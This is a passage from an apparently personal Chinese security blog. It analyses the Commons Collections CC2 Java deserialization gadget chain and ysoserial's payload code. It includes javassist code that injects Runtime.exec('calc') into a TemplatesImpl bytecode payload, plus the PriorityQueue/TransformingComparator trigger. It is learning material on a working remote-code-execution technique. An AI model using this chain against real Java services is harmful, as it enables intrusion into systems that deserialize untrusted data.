class="line"></span><br><span class="line"></span><br><span class="line">BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valfield = poc.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">valfield.set(poc, entry);</span><br></pre></td></tr></table></figure>
<h2 id="cc2-payload分析"><a href="#cc2-payload分析" class="headerlink" title="cc2 payload分析"></a>cc2 payload分析</h2><p>来看yso如何实现的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);<span class="comment">//命令参数传入createTemplatesImpl方法</span></span><br><span class="line">      <span class="comment">// mock method name until armed</span></span><br><span class="line">       <span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>,  <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">       <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span>  TransformingComparator(transformer));</span><br><span class="line">       <span class="comment">// stub data for replacement later</span></span><br><span class="line">       queue.add(<span class="number">1</span>);</span><br><span class="line">       queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="comment">// switch method called by comparator</span></span><br><span class="line">       Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="comment">// switch contents of queue</span></span><br><span class="line">       <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue,  <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">       queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">       queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先将我们命令参数传入Gadgets.createTemplatesImpl方法</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/8.png" alt="8"><br>跟进</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/9.png" alt="9"></p>
<p>先通过 System.getProperty() 方法获取系统属性 properXalan 的值做if判断，都是调用createTemplatesImpl的重载方法，判断值为true时使用全限定类名传参，反之使用非限定类名传参</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/10.png" alt="10"><br>这里生成clazz类，父类为AbstractTranslet，和之前的paylaod一样，继续<br>通过toBytecode() 方法获取恶意类的字节码 , 并通过 Java 反射机制将字节码填充到 TemplatesImpl 实例对象的 _ bytecodes 属性数组中</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/11.png" alt="11"><br>到这里返回一个携带恶意类字节码的 TemplatesImpl 实例对象，这个方法做了两件事，一是动态创建一个恶意类，二是将字节码插入到TemplatesImpl对象返回。</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/12.png" alt="12"></p>
<p>定义一个invokertransform类型的transform实例对象，传入TransformingComparator构造方法中作为队列的参数</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/13.png" alt="13"></p>
<p>优先级队列每次比较时都会调用比较器的 compare() 方法 , 当服务端执行到这里时 , 就会调用 TransformingComparator.compare() 方法 .进而调用 this.transformer.transform(obj1) 方法 , 即执行 : InvokerTransformer.transform() 方法 , 进入可控的反射调用.</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/14.png" alt="14"></p>
<p>反射调用 newTransformer() 方法,为什么调用该方法，跟进看看</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/15.png" alt="15"></p>
<p>跟进getTransletInstance()</p>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/16.png" alt="16"></p>
<p>通过字节码加载恶意类并实例化。<br>最后传入恶意字节码到queue最后实现序列化</p>
<p>defineTransletClasses实现如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span>  TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/17.png" alt="17"></p>
<p>其实这样分析不了很清楚，还是根据payload自己搭环境分析清楚一点，只是想熟悉一下该工具，以后学习可以根据payload分析之后再根据该工具自行编写payload会好一点。</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/12571787.html">https://www.cnblogs.com/litlife/p/12571787.html</a><br><a target="_blank" rel="noopener" href="https://www.guildhab.top/2020/07/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e5-%e8%a7%a3%e5%af%86-ysoserial-java%e5%8a%a8%e6%80%81%e4%bb%a3%e7%90%86%e6%9c%ba%e5%88%b6/">https://www.guildhab.top/2020/07/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e5-%e8%a7%a3%e5%af%86-ysoserial-java%e5%8a%a8%e6%80%81%e4%bb%a3%e7%90%86%e6%9c%ba%e5%88%b6/</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/03/19/cc2%E9%93%BE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/ckrie.jpg">
      <meta itemprop="name" content="热爱篮球和安全的小伙子">
      <meta itemprop="description" content="记录我的学习之旅">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hungry and humble">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/19/cc2%E9%93%BE/" class="post-title-link" itemprop="url">cc2链</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-03-19 21:28:25" itemprop="dateCreated datePublished" datetime="2021-03-19T21:28:25+08:00">2021-03-19</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-04-03 20:19:02" itemprop="dateModified" datetime="2021-04-03T20:19:02+08:00">2021-04-03</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><h2 id="javassist学习"><a href="#javassist学习" class="headerlink" title="javassist学习"></a>javassist学习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">javassist使用</span></span><br><span class="line"><span class="comment">主要类</span></span><br><span class="line"><span class="comment">ClassPool:基于哈希表实现的CtClass对象容器，键名是类名称，值是该类CtClass对象</span></span><br><span class="line"><span class="comment">常用方法：</span></span><br><span class="line"><span class="comment">static ClassPool     getDefault()</span></span><br><span class="line"><span class="comment">       返回默认的类池。</span></span><br><span class="line"><span class="comment">ClassPath     insertClassPath(java.lang.String pathname)</span></span><br><span class="line"><span class="comment">       在搜索路径的开头插入目录或jar（或zip）文件。</span></span><br><span class="line"><span class="comment">ClassPath     insertClassPath(ClassPath cp)</span></span><br><span class="line"><span class="comment">       ClassPath在搜索路径的开头插入一个对象。</span></span><br><span class="line"><span class="comment">java.lang.ClassLoader      getClassLoader()</span></span><br><span class="line"><span class="comment">       获取类加载器toClass()，getAnnotations()在 CtClass等</span></span><br><span class="line"><span class="comment">CtClass       get(java.lang.String classname)</span></span><br><span class="line"><span class="comment">       从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用。</span></span><br><span class="line"><span class="comment">ClassPath     appendClassPath(ClassPath cp)</span></span><br><span class="line"><span class="comment">       将ClassPath对象附加到搜索路径的末尾。</span></span><br><span class="line"><span class="comment">CtClass       makeClass(java.lang.String classname)</span></span><br><span class="line"><span class="comment">       创建一个新的public类</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CtClass类；</span></span><br><span class="line"><span class="comment">常用方法</span></span><br><span class="line"><span class="comment">void   setSuperclass(CtClass clazz)</span></span><br><span class="line"><span class="comment">       更改超类，除非此对象表示接口。</span></span><br><span class="line"><span class="comment">java.lang.Class&lt;?&gt;   toClass(java.lang.invoke.MethodHandles.Lookup lookup)</span></span><br><span class="line"><span class="comment">       将此类转换为java.lang.Class对象。</span></span><br><span class="line"><span class="comment">byte[] toBytecode()</span></span><br><span class="line"><span class="comment">       将该类转换为类文件。</span></span><br><span class="line"><span class="comment">void   writeFile()</span></span><br><span class="line"><span class="comment">       将由此CtClass 对象表示的类文件写入当前目录。</span></span><br><span class="line"><span class="comment">void   writeFile(java.lang.String directoryName)</span></span><br><span class="line"><span class="comment">       将由此CtClass 对象表示的类文件写入本地磁盘。</span></span><br><span class="line"><span class="comment">CtConstructor makeClassInitializer()</span></span><br><span class="line"><span class="comment">       制作一个空的类初始化程序（静态构造函数）。</span></span><br><span class="line"><span class="comment">CtMethod</span></span><br><span class="line"><span class="comment">CtMethod：表示类中的方法。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CtConstructor</span></span><br><span class="line"><span class="comment">CtConstructor的实例表示一个构造函数。它可能代表一个静态构造函数（类初始化器）。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用javassis来创建一个Person类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CreatClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取javassist维护的类池</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//创建一个空类</span></span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">        <span class="comment">//给ctClass类即public类添加一个string类型的字段</span></span><br><span class="line">        CtField name = <span class="keyword">new</span> CtField(pool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span>,ctClass);</span><br><span class="line">        <span class="comment">//设置private权限</span></span><br><span class="line">        name.setModifiers(Modifier.PRIVATE);<span class="comment">//CtField类setModifiers方法  arg:Modifier类字段返回int类型</span></span><br><span class="line">        <span class="comment">//初始化name字段为张三</span></span><br><span class="line">        ctClass.addField(name,  CtField.Initializer.constant(<span class="string">&quot;zhangsan&quot;</span>));<span class="comment">//CtClass类addField方法 args1:CtField对象，args2:内部静态Initializer类对象</span></span><br><span class="line">        <span class="comment">//生成get,set方法</span></span><br><span class="line">        ctClass.addMethod(CtNewMethod.getter(<span class="string">&quot;getName&quot;</span>, name));<span class="comment">//addMethod方法  args1:方法名，args2:CtField对象</span></span><br><span class="line">        ctClass.addMethod(CtNewMethod.setter(<span class="string">&quot;setname&quot;</span>,name));</span><br><span class="line">        <span class="comment">//添加无参构造参数</span></span><br><span class="line">        CtConstructor ctConstructor0 = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, ctClass);</span><br><span class="line">        ctConstructor0.setBody(<span class="string">&quot;&#123;name=\&quot;xiaoming\&quot;;&#125;&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(ctConstructor0);</span><br><span class="line">        <span class="comment">//添加有参构造参数</span></span><br><span class="line">        CtConstructor ctConstructor1 = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span>  CtClass[]&#123;pool.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;, ctClass);</span><br><span class="line">        ctConstructor1.setBody(<span class="string">&quot;&#123;$0.name=$1;&#125;&quot;</span>);<span class="comment">//设置函数构造主体，$1表示的第一个参数</span></span><br><span class="line">        ctClass.addConstructor(ctConstructor1);</span><br><span class="line">        <span class="comment">//创建一个public方法printName()无参无返回值</span></span><br><span class="line">        CtMethod printName = <span class="keyword">new</span> CtMethod(CtClass.voidType, <span class="string">&quot;PrintName&quot;</span>, <span class="keyword">new</span>  CtClass[]&#123;&#125;, ctClass);<span class="comment">//构造方法args1:函数返回类型，函数名，无参，类名</span></span><br><span class="line">        printName.setModifiers(Modifier.PUBLIC);<span class="comment">//设置public</span></span><br><span class="line">        printName.setBody(<span class="string">&quot;&#123;System.out.println($0.name);&#125;&quot;</span>);<span class="comment">//设置函数体</span></span><br><span class="line">        ctClass.addMethod(printName);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//写入class文件</span></span><br><span class="line">        ctClass.writeFile();</span><br><span class="line">        ctClass.detach();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*      //通过反射调用person类的方法</span></span><br><span class="line"><span class="comment">        Object o = ctClass.toClass().newInstance();</span></span><br><span class="line"><span class="comment">        Method setname = o.getClass().getMethod(&quot;setname&quot;, String.class);</span></span><br><span class="line"><span class="comment">        setname.invoke(o, &quot;hungry&quot;);</span></span><br><span class="line"><span class="comment">        Method printname = o.getClass().getMethod(&quot;PrintName&quot;);</span></span><br><span class="line"><span class="comment">        printname.invoke(o);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">//通过加载class文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>网上有很多javassist的文章，不再赘述。</p>
<p>根据poc先逆向分析一波</p>
<h2 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String  AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"><span class="comment">//1.创建动态一个类，设置父类添加命令执行内容</span></span><br><span class="line">ClassPool classPool=ClassPool.getDefault();<span class="comment">//返回默认的类池</span></span><br><span class="line">classPool.appendClassPath(AbstractTranslet);<span class="comment">//添加AbstractTranslet的搜索路径</span></span><br><span class="line">CtClass payload=classPool.makeClass(<span class="string">&quot;CommonsCollections22222222222&quot;</span>);<span class="comment">//创建一个新的public类</span></span><br><span class="line">payload.setSuperclass(classPool.get(AbstractTranslet));  <span class="comment">//设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet</span></span><br><span class="line"><span class="comment">// 为什么要设置父类为AbstractTranslet</span></span><br><span class="line">payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>); <span class="comment">//创建一个空的类初始化，设置构造函数主体为runtime</span></span><br><span class="line"><span class="comment">//这里就是生成一个payload的类</span></span><br></pre></td></tr></table></figure>
<p>这里没什么好说的，提出问题：为什么要设置父类为abstractranslet类？</p>
<h2 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.通过反射获取并设置templatesImpl的_bytecodes字段为runtime的byte数组,该类最终会将payuload实例化，接下来考虑怎么调用newtransformer方法</span></span><br><span class="line"><span class="keyword">byte</span>[] bytes=payload.toBytecode();<span class="comment">//转换为byte数组</span></span><br><span class="line">Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span>  Class[]&#123;&#125;).newInstance();<span class="comment">//反射创建TemplatesImpl实例</span></span><br><span class="line">Field field=templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);<span class="comment">//反射获取templatesImpl的_bytecodes字段</span></span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">field.set(templatesImpl,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytes&#125;);<span class="comment">//将templatesImpl上的_bytecodes字段设置为runtime的byte数组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Field field1=templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);<span class="comment">//反射获取templatesImpl的_name字段</span></span><br><span class="line">field1.setAccessible(<span class="keyword">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">field1.set(templatesImpl,<span class="string">&quot;test&quot;</span>);<span class="comment">//将templatesImpl上的_name字段设置为test</span></span><br></pre></td></tr></table></figure>
<p>像cc1又需要考虑到runtime实例化的问题，为什么使用的是templatesImpl类而不是其他类来构造的原因其实和_bytecodes设置为payload字节码有关系的。</p>
<p>跟进templatesImpl类，找到哪个方法会调用_bytecodes<br><img src="/2021/03/19/cc2%E9%93%BE/1.png" alt="1"></p>
<p>会传递给_class,然后在getTransletInstance方法里进行实例化操作</p>
<p><img src="/2021/03/19/cc2%E9%93%BE/2.png" alt="2"><br>到这里也就解决了runtime实例化的问题。回到提出的问题1，这里实例化后的类型是abstractranslet，这就是为什么为payload设置abstractranslet父类的原因。</p>
<p>那么接下来的问题就是怎么调用getTransletInstance，同样是该类中的newTransformer</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
